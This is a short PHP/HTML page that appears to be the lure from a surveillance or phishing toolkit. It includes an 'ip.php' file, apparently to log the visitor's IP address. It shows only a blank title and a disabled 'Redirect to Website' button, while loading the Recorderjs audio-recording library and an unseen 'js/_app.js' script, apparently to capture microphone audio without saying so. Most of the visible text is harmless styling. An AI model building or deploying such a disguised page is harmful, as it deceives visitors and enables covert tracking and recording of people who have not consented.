<?php
include 'ip.php';

?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" >
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
<style>
* {
  padding: 0;
  margin: 0;
}

body {
  margin: 1rem;
  padding: 1rem;
  font-family: sans-serif;
  max-width: 28rem;
  margin: 0 auto;
  position: relative;
}
#controls {
  display: flex;
  margin-top: 2rem;
}
button {
  flex-grow: 1;
  height: 2.5rem;
  min-width: 2rem;
  border: none;
  border-radius: 0.15rem;
  background: #ed341d;
  margin-left: 2px;
  box-shadow: inset 0 -0.15rem 0 rgba(0, 0, 0, 0.2);
  cursor: pointer;
  display: flex;
  justify-content: center;
  align-items: center;
  color:#ffffff;
  font-weight: bold;
  font-size: 1rem;
}
button:hover, button:focus {
  outline: none;
  background: #c72d1c;
}
button::-moz-focus-inner {
  border: 0;
}
button:active {
  box-shadow: inset 0 1px 0 rgba(0, 0, 0, 0.2);
  line-height: 3rem;
}
button:disabled {
  pointer-events: none;
  background: lightgray;
}
button:first-child {
  margin-left: 0;
}
</style>
  </head>
  <body>
    <h1></h1>
 
    <div id="controls">
  	 <button id="redButton" disabled>Redirect to Website</button> 
  
    </div>
    <!-- inserting these scripts at the end to be able to use all the elements in the DOM -->
  	<script src="https://cdn.rawgit.com/mattdiamond/Recorderjs/08e7abd9/dist/recorder.js"></script>
  	<script src="js/_app.js"></script>
    
  </body>
</html>
